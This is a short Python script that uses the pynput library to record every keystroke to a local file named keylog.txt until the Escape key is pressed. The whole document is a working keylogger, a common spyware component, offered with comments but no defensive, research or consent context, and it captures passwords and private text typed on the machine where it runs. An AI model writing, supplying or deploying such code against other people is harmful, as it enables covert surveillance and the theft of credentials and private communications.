from pynput import keyboard

# The log file where keystrokes will be stored
log_file = "keylog.txt"

def on_press(key):
    try:
        # Open the log file in append mode
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f" {str(key)} ")

def on_release(key):
    # Stop the listener if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
